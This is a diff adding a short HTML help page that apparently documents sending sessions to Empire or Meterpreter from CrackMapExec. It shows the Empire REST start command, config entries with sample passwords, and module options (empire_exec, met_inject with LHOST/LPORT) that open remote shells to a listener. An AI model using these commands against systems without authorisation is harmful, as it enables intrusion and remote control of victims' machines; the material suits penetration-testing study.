@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Send To Empire/Meterpreter</title>
+</head><body>Module!<br/>
+Need to run empire with # ./empire --rest --password 'Password123!'<br/>
+<br/>
+For empire, also need to set the password in the CME conf file:<br/>
+[Empire]<br/>
+api_host=127.0.0.1<br/>
+api_port=1337<br/>
+username=empireadmin<br/>
+password=Password123!<br/>
+<br/>
+[Metasploit]<br/>
+rpc_host=127.0.0.1<br/>
+rpc_port=55552<br/>
+password=abc123<br/>
+<br/>
+<br/>
+<br/>
+-M empire_exec -o LISTENER=&lt;Listener_name&gt;<br/>
+-M met_inject -o LHOST='' -lPORT=''<br/>
+<br/>
+</body></html>
